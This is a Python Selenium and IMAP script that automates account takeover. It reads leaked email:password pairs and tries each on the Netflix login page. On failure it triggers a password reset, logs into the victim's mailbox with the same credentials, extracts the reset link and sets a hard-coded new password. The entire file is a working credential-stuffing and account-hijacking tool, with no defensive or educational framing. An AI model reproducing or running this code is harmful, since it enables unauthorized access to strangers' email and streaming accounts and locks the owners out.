import email
import imaplib
import re

from selenium import webdriver
import time

def reverslist():

    path = input('path file:')
    with open(path, "r") as fil:
        lists = list(fil)
        fil.close()
    with open("reversed.txt", "w") as fil2:
        n = len(lists)
        while n != 0:
            fil2.write(lists[n-1])
            n = n-1
        fil2.close()


def cleand():
    with open('reversed.txt', "r") as fil:
        lists = list(fil)
        fil.close()
    with open("cleanfile.txt", "w") as fil2:
        for n in lists:
            if "@" in n:
                fil2.write(n)

        fil2.close()



def emailsender(username, password):
    url = 'https://www.netflix.com/dz-fr/login'
    driver = webdriver.Chrome("C:/Users/User/Downloads/chromedriver")
    driver.get(url)
    driver.find_element_by_id('id_userLoginId').send_keys(username)
    driver.find_element_by_id('id_password').send_keys(password)
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/button').click()
    time.sleep(1)
    if 'Mot de passe' in driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/div/div[2]').text:
        driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/div/div[2]/a').click()
        time.sleep(1)
        driver.find_element_by_id('forgot_password_input').send_keys(username)
        time.sleep(1)
        driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/button').click()
        time.sleep(1)
        driver.close()
        return True
    else:
        driver.close()
        return False


def emailopener(url):
    try:
        driver = webdriver.Chrome("C:/Users/User/Downloads/chromedriver")
        driver.get(url)
        driver.find_element_by_id('id_newPassword').send_keys('ayoubpy')
        driver.find_element_by_id('id_confirmNewPassword').send_keys('ayoubpy')
        time.sleep(1)
        driver.find_element_by_id('btn-save').click()
        time.sleep(1)
        return True
    except:
        return False


def serverfinder(emailclient,passw):
    servpart = emailclient.split('@')
    with open('config.cfg','r',encoding='utf-8') as conf_file:
        listconf = list(conf_file)
        for serv in listconf:
            urlfound = serv.split('|')
            if servpart[1] == urlfound[0]:
                return urlfound[1]
                #print(emailclient,'==>',urlfound[0],urlfound[1])
                #connexion(str(urlfound[1]).rstrip("\n"), emailclient, passw.rstrip("\n"))
        return 0



######################################################################################################


def getbody(msg):
    if msg.is_multipart():
        return getbody(msg.get_payload(0))
    else:
        return msg.get_payload(None, True)


def get_email(result_bytes,con,bodut):
    msgs = []
    for num in result_bytes[0].split():
        typ, data = con.fetch(num, bodut)
        if type(data[0][1]) is int:
            return 0
        else:
            print(getbody(email.message_from_bytes(data[0][1])))
            msgs.append(getbody(email.message_from_bytes(data[0][1])))
    return msgs


def connexion(url, username, password):
    try:
        con = imaplib.IMAP4_SSL(url)
        con.login(username, password)
        con.select('INBOX')
        typ, data = con.search(None, 'FROM','info@mailer.netflix.com')
        emails = get_email(data, con,'RFC822' )
        if emails == 0:
            emails = get_email(data, con, 'BODY')
        listurl = re.search("(?P<url>https?://[^\s]+)", str(emails[-1])).group("url")
        return listurl
    except:
        return False


######################################################################################################


def main():
    reverslist()
    cleand()
    with open('cleanfile.txt', 'r', encoding='utf-8') as file1:
        newlist = list(file1)
    file1.close()
    with open('resultafinal.txt', 'w', encoding='utf-8') as file2:
        for n in newlist:
            usepass = str(n).split(':')
            resultat = str(usepass[0] + ':' + usepass[1] + '======>')
            if emailsender(usepass[0], usepass[1]):
                time.sleep(7)
                servfound = serverfinder(usepass[0], usepass[1])
                if servfound != 0:
                    consecces = connexion(str(servfound).rstrip("\n"), usepass[0], usepass[1].rstrip("\n"))
                    if consecces:
                        passchanged = emailopener(consecces)
                        if passchanged:
                            print('++++++++ '+resultat+' password changed')
                        else:
                            print('ss')
                            file2.write(str('-------- '+resultat+' email not sended'))
                    else:
                        print('sss')
                        file2.write('-------- '+resultat+' email not opened')
                else:
                    print('sss')
                    file2.write('-------- '+resultat+' server not found')
            else:
                print('sss')
                file2.write(str('-------- '+resultat+' email not available'))

            file2.close()


if __name__ == '__main__':
    main()